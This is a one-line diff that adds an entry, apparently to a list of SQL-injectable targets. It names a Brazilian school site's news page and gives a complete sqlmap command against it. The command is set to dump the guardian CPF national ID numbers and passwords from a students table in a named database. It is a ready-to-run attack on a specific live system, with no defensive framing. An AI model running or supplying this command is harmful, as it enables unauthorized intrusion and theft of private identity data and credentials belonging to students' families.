@@ -1,0 +1,1 @@
+https://www.ctsfa.com.br/noticia.php?id=1310 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.ctsfa.com.br/noticia.php?id=1310 -D ctsfa_temp -T alunos -C cpfresponsavel,senha --dump
